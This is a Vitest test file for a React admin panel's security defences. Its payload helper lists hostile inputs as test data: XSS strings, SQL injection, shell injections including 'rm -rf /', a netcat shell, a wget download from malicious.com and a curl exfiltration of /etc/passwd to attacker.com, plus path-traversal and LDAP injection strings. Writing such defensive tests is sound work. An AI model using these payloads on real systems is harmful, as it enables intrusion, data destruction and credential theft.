import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { BrowserRouter } from 'react-router-dom';
import { vi, describe, it, expect, beforeEach, afterEach } from 'vitest';
import userEvent from '@testing-library/user-event';

// Import admin components
import { AdminContext } from '../../contexts/AdminContext';
import { AdminRoute } from '../../components/admin/AdminRoute';
import AdminPanel from '../../components/admin/AdminPanel';
import { UserManagement } from '../../components/admin/UserManagement/UserManagement';
import { Configuration } from '../../components/admin/Configuration';

// Mock services
vi.mock('../../services/adminApiService', () => ({
  adminApiService: {
    getUsers: vi.fn(),
    updateUser: vi.fn(),
    deleteUser: vi.fn(),
    adjustUserCredits: vi.fn(),
    getSystemStats: vi.fn(),
    getAuditLogs: vi.fn(),
    logAdminAction: vi.fn(),
  }
}));

vi.mock('../../contexts/AuthContext', () => ({
  useAuth: vi.fn(),
}));

// Security testing utilities
const generateMaliciousPayloads = () => ({
  xss: [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    'javascript:alert("XSS")',
    '<svg onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '\';alert("XSS");//',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload="alert(\'XSS\')">',
    '<div onclick="alert(\'XSS\')">Click me</div>',
    'data:text/html,<script>alert("XSS")</script>',
  ],
  sqlInjection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; DELETE FROM users WHERE '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
  ],
  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "; cat /etc/shadow",
    "| nc -l -p 1234 -e /bin/sh",
    "; wget http://malicious.com/shell.sh",
    "$(whoami)",
    "`id`",
    "; curl http://attacker.com/steal?data=$(cat /etc/passwd)",
    "| python -c 'import os; os.system(\"rm -rf /\")'",
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc//passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "\\..\\..\\..\\etc\\passwd",
    "/var/www/../../etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
    "file:///etc/passwd",
  ],
  ldapInjection: [
    "*)(uid=*))(|(uid=*",
    "*)(|(password=*))",
    "admin)(&(password=*))",
    "*))%00",
    "*()|%26'",
    "*)(objectClass=*",
    "admin)(|(objectClass=*",
    "*)(cn=*))(|(cn=*",
    "*)(&(objectClass=user)(cn=*",
    "*)(userPassword=*))(|(userPassword=*",
  ],
});

const simulateNetworkConditions = {
  slowNetwork: () => {
    // Simulate slow network by adding delays to API calls
    return new Promise(resolve => setTimeout(resolve, 5000));
  },
  intermittentConnection: () => {
    // Randomly fail requests to simulate poor connection
    return Math.random() < 0.3 ? Promise.reject(new Error('Network Error')) : Promise.resolve();
  },
  highLatency: () => {
    // Simulate high latency
    return new Promise(resolve => setTimeout(resolve, 2000));
  },
};

const createTestWrapper = (user = null) => {
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: { retry: false },
      mutations: { retry: false },
    },
  });

  // Mock useAuth hook
  const { useAuth } = require('../../contexts/AuthContext');
  vi.mocked(useAuth).mockReturnValue({
    user,
    login: vi.fn(),
    logout: vi.fn(),
    isLoading: false,
    error: null,
  });

  return ({ children }: { children: React.ReactNode }) => (
    <QueryClientProvider client={queryClient}>
      <BrowserRouter>
        {children}
      </BrowserRouter>
    </QueryClientProvider>
  );
};

describe('Admin Panel Security Penetration Tests', () => {
  let user: ReturnType<typeof userEvent.setup>;

  beforeEach(() => {
    vi.clearAllMocks();
    user = userEvent.setup();
    localStorage.clear();
    sessionStorage.clear();
    
    // Reset any global state
    document.cookie = '';
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Authentication and Authorization Bypass Attempts', () => {
    it('prevents direct URL access to admin routes without authentication', () => {
      const TestWrapper = createTestWrapper(null);
      
      render(
        <AdminRoute>
          <AdminPanel />
        </AdminRoute>,
        { wrapper: TestWrapper }
      );

      // Should not render admin panel
      expect(screen.queryByTestId('admin-panel')).not.toBeInTheDocument();
      expect(screen.getByText(/unauthorized/i)).toBeInTheDocument();
    });

    it('prevents privilege escalation attempts', () => {
      const regularUser = {
        id: '1',
        email: 'user@test.com',
        role: 'user',
        name: 'Regular User',
      };

      const TestWrapper = createTestWrapper(regularUser);
      
      render(
        <AdminRoute>
          <AdminPanel />
        </AdminRoute>,
        { wrapper: TestWrapper }
      );

      // Regular user should not access admin panel
      expect(screen.getByText(/unauthorized access/i)).toBeInTheDocument();
    });

    it('prevents super admin feature access by regular admins', () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const TestWrapper = createTestWrapper(adminUser);
      
      render(
        <AdminRoute requiredRole="super_admin">
          <Configuration />
        </AdminRoute>,
        { wrapper: TestWrapper }
      );

      // Regular admin should not access super admin features
      expect(screen.getByText(/insufficient permissions/i)).toBeInTheDocument();
    });

    it('validates session tokens and prevents session hijacking', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      
      // Simulate invalid/expired session
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: { status: 401, data: { message: 'Invalid session token' } },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText(/session expired/i)).toBeInTheDocument();
      });
    });

    it('prevents token manipulation attacks', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // Simulate manipulated token
      localStorage.setItem('auth_token', 'manipulated.token.here');
      
      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: { status: 403, data: { message: 'Invalid token signature' } },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText(/invalid token/i)).toBeInTheDocument();
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Attack Prevention', () => {
    it('sanitizes user input in search fields', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const searchInput = screen.getByPlaceholderText(/search users/i) as HTMLInputElement;
      const maliciousPayloads = generateMaliciousPayloads().xss;

      for (const payload of maliciousPayloads) {
        await user.clear(searchInput);
        await user.type(searchInput, payload);
        
        // Input should be sanitized
        expect(searchInput.value).not.toContain('<script>');
        expect(searchInput.value).not.toContain('javascript:');
        expect(searchInput.value).not.toContain('onerror=');
        expect(searchInput.value).not.toContain('onload=');
      }
    });

    it('prevents XSS in dynamic content rendering', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      
      // Mock API response with potentially malicious content
      vi.mocked(adminApiService.getUsers).mockResolvedValue({
        success: true,
        data: [
          {
            id: '1',
            name: '<script>alert("XSS")</script>',
            email: 'test@example.com',
            role: 'user',
            status: 'active',
            registrationDate: new Date('2024-01-01'),
            lastLogin: new Date('2024-01-15'),
            agentCount: 3,
            callCount: 150,
            creditsUsed: 500,
            creditsRemaining: 1500,
          },
        ],
        pagination: { total: 1, page: 1, limit: 10, totalPages: 1 },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        // Content should be escaped/sanitized
        expect(screen.queryByText('<script>alert("XSS")</script>')).not.toBeInTheDocument();
        // Should show escaped version or sanitized content
        const nameCell = screen.getByText(/script/i);
        expect(nameCell.textContent).not.toContain('<script>');
      });
    });

    it('prevents XSS in form submissions', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockResolvedValue({
        success: true,
        data: [
          {
            id: '1',
            name: 'John Doe',
            email: 'john@example.com',
            role: 'user',
            status: 'active',
            registrationDate: new Date('2024-01-01'),
            lastLogin: new Date('2024-01-15'),
            agentCount: 3,
            callCount: 150,
            creditsUsed: 500,
            creditsRemaining: 1500,
          },
        ],
        pagination: { total: 1, page: 1, limit: 10, totalPages: 1 },
      });

      let capturedData: any = null;
      vi.mocked(adminApiService.adjustUserCredits).mockImplementation(async (userId, data) => {
        capturedData = data;
        return { success: true, data: { message: 'Credits adjusted' } };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText('John Doe')).toBeInTheDocument();
      });

      const adjustButton = screen.getByTestId('adjust-credits-1');
      await user.click(adjustButton);

      await waitFor(() => {
        expect(screen.getByTestId('credit-adjust-modal')).toBeInTheDocument();
      });

      const reasonInput = screen.getByLabelText(/reason/i);
      const maliciousReason = '<script>alert("XSS")</script>';
      
      await user.type(reasonInput, maliciousReason);
      
      const submitButton = screen.getByRole('button', { name: /adjust/i });
      await user.click(submitButton);

      await waitFor(() => {
        expect(capturedData).toBeTruthy();
        // Data should be sanitized before sending to API
        expect(capturedData.reason).not.toContain('<script>');
      });
    });
  });

  describe('SQL Injection Attack Prevention', () => {
    it('prevents SQL injection in search queries', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      
      let capturedSearchQuery: string | undefined;
      vi.mocked(adminApiService.getUsers).mockImplementation(async ({ search }) => {
        capturedSearchQuery = search;
        
        // Simulate backend validation
        if (search && (search.includes("'") || search.includes(';') || search.includes('--'))) {
          throw {
            response: { status: 400, data: { message: 'Invalid search query' } },
          };
        }
        
        return {
          success: true,
          data: [],
          pagination: { total: 0, page: 1, limit: 10, totalPages: 0 },
        };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const searchInput = screen.getByPlaceholderText(/search users/i);
      const sqlPayloads = generateMaliciousPayloads().sqlInjection;

      for (const payload of sqlPayloads) {
        await user.clear(searchInput);
        await user.type(searchInput, payload);
        
        // Trigger search
        fireEvent.keyDown(searchInput, { key: 'Enter' });

        await waitFor(() => {
          // Should either sanitize the input or show validation error
          if (capturedSearchQuery?.includes("'") || capturedSearchQuery?.includes(';')) {
            expect(screen.getByText(/invalid search query/i)).toBeInTheDocument();
          }
        });
      }
    });

    it('prevents SQL injection in filter parameters', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      
      let capturedFilters: any;
      vi.mocked(adminApiService.getUsers).mockImplementation(async ({ filters }) => {
        capturedFilters = filters;
        
        // Simulate backend validation
        const filterValues = Object.values(filters || {}).join(' ');
        if (filterValues.includes("'") || filterValues.includes(';') || filterValues.includes('--')) {
          throw {
            response: { status: 400, data: { message: 'Invalid filter parameters' } },
          };
        }
        
        return {
          success: true,
          data: [],
          pagination: { total: 0, page: 1, limit: 10, totalPages: 0 },
        };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      // Try to inject SQL through filter dropdown
      const statusFilter = screen.getByTestId('status-filter');
      
      // Simulate malicious option injection (this would be prevented by proper implementation)
      const maliciousValue = "'; DROP TABLE users; --";
      
      // In a real scenario, this would be prevented by using predefined options
      fireEvent.change(statusFilter, { target: { value: maliciousValue } });

      await waitFor(() => {
        if (capturedFilters?.status?.includes("'")) {
          expect(screen.getByText(/invalid filter parameters/i)).toBeInTheDocument();
        }
      });
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Attack Prevention', () => {
    it('validates CSRF tokens on state-changing operations', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // Mock CSRF token
      const csrfToken = 'csrf-token-123';
      const mockMetaElement = document.createElement('meta');
      mockMetaElement.name = 'csrf-token';
      mockMetaElement.content = csrfToken;
      document.head.appendChild(mockMetaElement);

      const { adminApiService } = await import('../../services/adminApiService');
      
      let capturedHeaders: any;
      vi.mocked(adminApiService.updateUser).mockImplementation(async (userId, data, options) => {
        capturedHeaders = options?.headers;
        
        if (!capturedHeaders?.['X-CSRF-Token']) {
          throw {
            response: { status: 403, data: { message: 'CSRF token missing' } },
          };
        }
        
        return { success: true, data: { message: 'User updated' } };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      // Simulate user update action
      const updateButton = screen.getByTestId('update-user-1');
      await user.click(updateButton);

      await waitFor(() => {
        expect(capturedHeaders?.['X-CSRF-Token']).toBe(csrfToken);
      });

      document.head.removeChild(mockMetaElement);
    });

    it('rejects requests without valid CSRF tokens', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // No CSRF token available
      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.updateUser).mockRejectedValue({
        response: { status: 403, data: { message: 'CSRF token missing' } },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const updateButton = screen.getByTestId('update-user-1');
      await user.click(updateButton);

      await waitFor(() => {
        expect(screen.getByText(/csrf token missing/i)).toBeInTheDocument();
      });
    });
  });

  describe('Session Security and Management', () => {
    it('handles session timeout gracefully', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: { status: 401, data: { message: 'Session expired' } },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText(/session expired/i)).toBeInTheDocument();
        expect(screen.getByText(/please log in again/i)).toBeInTheDocument();
      });
    });

    it('prevents session fixation attacks', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // Simulate session fixation attempt
      const fixedSessionId = 'fixed-session-123';
      localStorage.setItem('session_id', fixedSessionId);

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: { status: 401, data: { message: 'Invalid session' } },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText(/invalid session/i)).toBeInTheDocument();
      });
    });

    it('enforces session validation for sensitive operations', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.deleteUser).mockImplementation(async (userId, options) => {
        // Simulate session validation requirement for sensitive operations
        if (!options?.headers?.['X-Session-Validation']) {
          throw {
            response: { status: 401, data: { message: 'Session validation required for sensitive operations' } },
          };
        }
        return { success: true, data: { message: 'User deleted' } };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const deleteButton = screen.getByTestId('delete-user-1');
      await user.click(deleteButton);

      await waitFor(() => {
        expect(screen.getByText(/session validation required/i)).toBeInTheDocument();
      });
    });
  });

  describe('Data Exposure and Information Disclosure', () => {
    it('prevents sensitive data exposure in client-side storage', () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
        apiKey: 'sk-1234567890abcdef',
        sessionToken: 'jwt-token-sensitive-data',
      };

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      // Check localStorage and sessionStorage for sensitive data
      const localStorageData = JSON.stringify(localStorage);
      const sessionStorageData = JSON.stringify(sessionStorage);

      // Sensitive data should not be stored in browser storage
      expect(localStorageData).not.toContain('sk-1234567890abcdef');
      expect(localStorageData).not.toContain('jwt-token-sensitive-data');
      expect(sessionStorageData).not.toContain('sk-1234567890abcdef');
      expect(sessionStorageData).not.toContain('jwt-token-sensitive-data');
    });

    it('masks sensitive data in API responses', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockResolvedValue({
        success: true,
        data: [
          {
            id: '1',
            name: 'John Doe',
            email: 'john@example.com',
            role: 'user',
            status: 'active',
            registrationDate: new Date('2024-01-01'),
            lastLogin: new Date('2024-01-15'),
            agentCount: 3,
            callCount: 150,
            creditsUsed: 500,
            creditsRemaining: 1500,
            // Sensitive data should be masked
            apiKey: 'sk-***************',
            phoneNumber: '***-***-1234',
            ssn: '***-**-****',
          },
        ],
        pagination: { total: 1, page: 1, limit: 10, totalPages: 1 },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText('sk-***************')).toBeInTheDocument();
        expect(screen.getByText('***-***-1234')).toBeInTheDocument();
        expect(screen.getByText('***-**-****')).toBeInTheDocument();
        
        // Should not show actual sensitive data
        expect(screen.queryByText(/sk-[a-zA-Z0-9]{32}/)).not.toBeInTheDocument();
        expect(screen.queryByText(/\d{3}-\d{3}-\d{4}/)).not.toBeInTheDocument();
        expect(screen.queryByText(/\d{3}-\d{2}-\d{4}/)).not.toBeInTheDocument();
      });
    });

    it('prevents information disclosure through error messages', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: {
          status: 500,
          data: {
            message: 'Database connection failed: Connection to mysql://admin:password123@localhost:3306/admin_db failed',
            stack: 'Error: Database connection failed\n    at DatabaseService.connect (/app/src/services/database.js:45:12)',
          },
        },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        const errorMessage = screen.getByText(/error/i);
        
        // Error message should not expose sensitive information
        expect(errorMessage.textContent).not.toContain('password123');
        expect(errorMessage.textContent).not.toContain('mysql://');
        expect(errorMessage.textContent).not.toContain('/app/src/services/database.js');
        expect(errorMessage.textContent).not.toContain('localhost:3306');
        
        // Should show generic error message
        expect(errorMessage.textContent).toContain('An error occurred');
      });
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    it('handles rate limiting gracefully', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: {
          status: 429,
          data: { message: 'Rate limit exceeded' },
          headers: { 'retry-after': '60' },
        },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText(/rate limit exceeded/i)).toBeInTheDocument();
        expect(screen.getByText(/try again in 60 seconds/i)).toBeInTheDocument();
      });
    });

    it('prevents rapid successive requests (request throttling)', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      
      let requestCount = 0;
      vi.mocked(adminApiService.getUsers).mockImplementation(async () => {
        requestCount++;
        return {
          success: true,
          data: [],
          pagination: { total: 0, page: 1, limit: 10, totalPages: 0 },
        };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const refreshButton = screen.getByTestId('refresh-users');
      
      // Rapid clicks should be throttled
      for (let i = 0; i < 10; i++) {
        await user.click(refreshButton);
      }

      await waitFor(() => {
        // Should not make 10 API calls due to throttling
        expect(requestCount).toBeLessThan(10);
      });
    });

    it('prevents brute force attacks on sensitive operations', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      
      let attemptCount = 0;
      vi.mocked(adminApiService.updateUser).mockImplementation(async () => {
        attemptCount++;
        
        if (attemptCount > 5) {
          throw {
            response: {
              status: 429,
              data: { message: 'Too many attempts. Account temporarily locked.' },
            },
          };
        }
        
        throw {
          response: {
            status: 400,
            data: { message: 'Invalid operation' },
          },
        };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const updateButton = screen.getByTestId('update-user-1');
      
      // Simulate multiple failed attempts
      for (let i = 0; i < 7; i++) {
        await user.click(updateButton);
        await waitFor(() => {
          // Wait for response
        });
      }

      await waitFor(() => {
        expect(screen.getByText(/account temporarily locked/i)).toBeInTheDocument();
      });
    });
  });

  describe('Network Security and Man-in-the-Middle Prevention', () => {
    it('enforces HTTPS for sensitive operations', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // Mock location to simulate HTTP
      Object.defineProperty(window, 'location', {
        value: {
          protocol: 'http:',
          hostname: 'admin.example.com',
        },
        writable: true,
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      // Should show security warning for HTTP
      await waitFor(() => {
        const securityWarning = screen.queryByText(/insecure connection/i);
        if (securityWarning) {
          expect(securityWarning).toBeInTheDocument();
        }
      });
    });

    it('validates SSL certificates and prevents certificate pinning bypass', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      vi.mocked(adminApiService.getUsers).mockRejectedValue({
        response: {
          status: 0,
          data: null,
          message: 'SSL certificate verification failed',
        },
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      await waitFor(() => {
        expect(screen.getByText(/connection security error/i)).toBeInTheDocument();
      });
    });
  });

  describe('Client-Side Security Vulnerabilities', () => {
    it('prevents DOM-based XSS attacks', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // Simulate malicious URL parameters
      const originalLocation = window.location;
      Object.defineProperty(window, 'location', {
        value: {
          ...originalLocation,
          search: '?search=<script>alert("XSS")</script>',
          hash: '#<img src=x onerror=alert("XSS")>',
        },
        writable: true,
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      // Check that URL parameters are sanitized
      const searchInput = screen.getByPlaceholderText(/search users/i) as HTMLInputElement;
      
      // Should not contain malicious script
      expect(searchInput.value).not.toContain('<script>');
      expect(searchInput.value).not.toContain('onerror=');

      // Restore original location
      Object.defineProperty(window, 'location', {
        value: originalLocation,
        writable: true,
      });
    });

    it('prevents clickjacking attacks', () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const TestWrapper = createTestWrapper(adminUser);
      render(<AdminPanel />, { wrapper: TestWrapper });

      // Check for frame-busting code or X-Frame-Options equivalent
      const frameCheck = () => {
        try {
          return window.self === window.top;
        } catch (e) {
          return false;
        }
      };

      // Should detect if running in frame
      expect(frameCheck()).toBe(true);
    });

    it('prevents prototype pollution attacks', () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      // Attempt prototype pollution
      const maliciousPayload = {
        '__proto__': {
          'isAdmin': true,
          'polluted': 'yes'
        }
      };

      // Simulate processing malicious data
      try {
        JSON.parse(JSON.stringify(maliciousPayload));
      } catch (e) {
        // Expected to fail or be sanitized
      }

      const TestWrapper = createTestWrapper(adminUser);
      render(<AdminPanel />, { wrapper: TestWrapper });

      // Check that prototype pollution didn't occur
      expect((Object.prototype as any).polluted).toBeUndefined();
      expect((Object.prototype as any).isAdmin).toBeUndefined();
    });
  });

  describe('Audit Trail and Security Monitoring', () => {
    it('logs all security-relevant events', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      const logSpy = vi.fn();
      vi.mocked(adminApiService.logAdminAction).mockImplementation(logSpy);

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      // Simulate security event
      const suspiciousButton = screen.getByTestId('suspicious-action-button');
      await user.click(suspiciousButton);

      await waitFor(() => {
        expect(logSpy).toHaveBeenCalledWith(
          expect.objectContaining({
            action: 'SECURITY_EVENT',
            severity: 'HIGH',
            ipAddress: expect.any(String),
            userAgent: expect.any(String),
            timestamp: expect.any(Date),
          })
        );
      });
    });

    it('detects and reports suspicious activity patterns', async () => {
      const adminUser = {
        id: '1',
        email: 'admin@test.com',
        role: 'admin',
        name: 'Admin User',
      };

      const { adminApiService } = await import('../../services/adminApiService');
      const alertSpy = vi.fn();
      
      // Mock suspicious activity detection
      let actionCount = 0;
      vi.mocked(adminApiService.updateUser).mockImplementation(async () => {
        actionCount++;
        
        if (actionCount > 10) {
          alertSpy('SUSPICIOUS_ACTIVITY_DETECTED');
          throw {
            response: {
              status: 429,
              data: { message: 'Suspicious activity detected. Account flagged for review.' },
            },
          };
        }
        
        return { success: true, data: { message: 'Updated' } };
      });

      const TestWrapper = createTestWrapper(adminUser);
      render(<UserManagement />, { wrapper: TestWrapper });

      const updateButton = screen.getByTestId('update-user-1');
      
      // Simulate rapid actions
      for (let i = 0; i < 12; i++) {
        await user.click(updateButton);
      }

      await waitFor(() => {
        expect(alertSpy).toHaveBeenCalledWith('SUSPICIOUS_ACTIVITY_DETECTED');
        expect(screen.getByText(/suspicious activity detected/i)).toBeInTheDocument();
      });
    });
  });
});